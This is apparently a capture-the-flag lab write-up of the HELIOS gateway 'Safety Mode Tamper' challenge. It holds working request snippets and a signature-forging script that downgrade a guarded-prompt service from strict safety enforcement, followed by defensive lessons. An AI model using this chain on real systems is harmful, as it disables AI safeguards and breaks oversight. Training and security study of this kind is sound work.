# CTF — Track 03 · HAG-02 · HELIOS API Gateway · Safety Mode Tamper

> Side activity — NOT a learning record. Status: ✅ SOLVED 2026-06-21.

**Flag:** `KA{hag_safety_mode_tamper_trainingflag}`

## Mission
HELIOS runs guarded prompts under a safety mode. The UI offers only `strict`. A legacy migration mode (`maintenance-omega`) survives. Switching to it requires a migration token, a matching policyBundle, and an overrideSig derived from the salt. The backend trusts client-supplied fields to select enforcement level.

## Attack chain
1. Probe invalid mode → multiply-encoded hint → decode → legacy mode name
2. Hit legacy path → `migrationToken` + `policySalt`
3. Probe with wrong policyBundle → error oracle reveals correct `policyBundle`
4. Compute `overrideSig = xorHex(policyBundle, reverse(policySalt))`
5. Fire downgrade with all fields + `ackLegacy: true` → flag

## Solved data
| item | value |
|---|---|
| allowedModeHint (raw) | `YldGcGJuUmxibUZ1WTJVdGIyMWxaMkU9` |
| after 1st base64 decode | `bWFpbnRlbmFuY2Utb21lZ2E=` |
| after 2nd base64 decode | `maintenance-omega` |
| migrationToken | `mig-0b8ac7` |
| policySalt | `Zx9` |
| reverse(policySalt) | `9xZ` |
| policyBundle | `legacy-2` (revealed by error oracle) |
| overrideSig | `551d3d581b23144a` |
| flag | `KA{hag_safety_mode_tamper_trainingflag}` |

## Solution walkthrough

### Step 1 — probe invalid mode → get double-base64 hint
```javascript
fetch('/api/challenges/HAG-02/action', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    actionId: 'execute-guarded-prompt',
    payload: { safetyMode: 'debug' }
  })
}).then(r => r.json()).then(console.log)
```
Response: `allowedModeHint: "YldGcGJuUmxibUZ1WTJVdGIyMWxaMkU9"`, note says "base64 twice".

### Step 2 — decode hint
```python
import base64
base64.b64decode(base64.b64decode("YldGcGJuUmxibUZ1WTJVdGIyMWxaMkU9")).decode()
# → "maintenance-omega"
```

### Step 3 — hit legacy path
```javascript
payload: { safetyMode: 'maintenance-omega' }
```
Response: `migrationToken: "mig-0b8ac7"`, `policySalt: "Zx9"`.

### Step 4 — error oracle for policyBundle
```javascript
payload: { safetyMode: 'maintenance-omega', migrationToken: 'mig-0b8ac7',
           policyBundle: 'default', overrideSig: '...', ackLegacy: true }
```
Error: `"requiredPolicyBundle": "legacy-2"` — exact value leaked.

### Step 5 — compute overrideSig
```python
def xor_hex(a, b):
    return ''.join(f'{ord(c) ^ ord(b[i % len(b)]):02x}' for i, c in enumerate(a))

xor_hex('legacy-2', '9xZ')  # → "551d3d581b23144a"
```

### Step 6 — fire downgrade
```javascript
payload: {
  safetyMode: 'maintenance-omega',
  migrationToken: 'mig-0b8ac7',
  policyBundle: 'legacy-2',
  overrideSig: '551d3d581b23144a',
  ackLegacy: true
}
```
→ `status: downgraded` → flag.

## Key learnings

### Attack class: client-controlled safety mode (OWASP API1 — Broken Object Level Authorization)
The backend trusted `safetyMode` from the client request to select enforcement level. A client that knows the legacy mode name can downgrade from `strict` to `maintenance-omega` (weaker policy). Safety enforcement level must never be client-controlled.

### Multiply-encoded hints as obscurity
The mode name was hidden behind double base64. This is security through obscurity — not encryption, not access control. One decode step and it's exposed. Lesson: encoding is not hiding.

### Error-message oracle (again)
`requiredPolicyBundle: "legacy-2"` was returned verbatim in the error response. Same pattern as HAG-01's echoTarget leak. Verbose error messages that name expected field values are an API security anti-pattern.

### Weak signature = XOR with known salt
`overrideSig = xorHex(policyBundle, reverse(policySalt))` — XOR is symmetric and reversible. The salt was returned by the server in plaintext. No secret key involved. Anyone who can read the policySalt can forge any overrideSig for any policyBundle.

## HAG track pattern so far

| # | Challenge | Core vuln | Oracle used |
|---|---|---|---|
| HAG-01 | Debug echo | Debug endpoint not removed; weak base64 diagId | Error revealed echoTarget |
| HAG-02 | Safety mode tamper | Client-controlled safetyMode; weak XOR sig | Error revealed policyBundle; double-b64 obscured mode name |
